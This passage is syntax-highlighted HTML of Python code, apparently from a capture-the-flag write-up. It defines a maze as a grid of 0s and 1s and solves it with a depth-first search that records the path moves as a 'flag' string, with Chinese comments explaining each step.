punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>usedmap <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># 生成与迷宫相同规格的全0列表，用来记录已经走过的位置  </span>  sti <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 初始位置的横坐标  </span>stj <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 初始位置的纵坐标  </span>edi <span class="token operator">=</span> <span class="token number">24</span>  <span class="token comment"># 终点位置的横坐标  </span>edj <span class="token operator">=</span> <span class="token number">23</span>  <span class="token comment"># 终点位置的纵坐标  </span>flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 走迷宫  </span>    <span class="token keyword">global</span> flag      <span class="token keyword">if</span> x <span class="token operator">==</span> edi <span class="token keyword">and</span> y <span class="token operator">==</span> edj<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>          <span class="token keyword">return</span>      <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往下走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'s'</span>  <span class="token comment"># 向下走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token 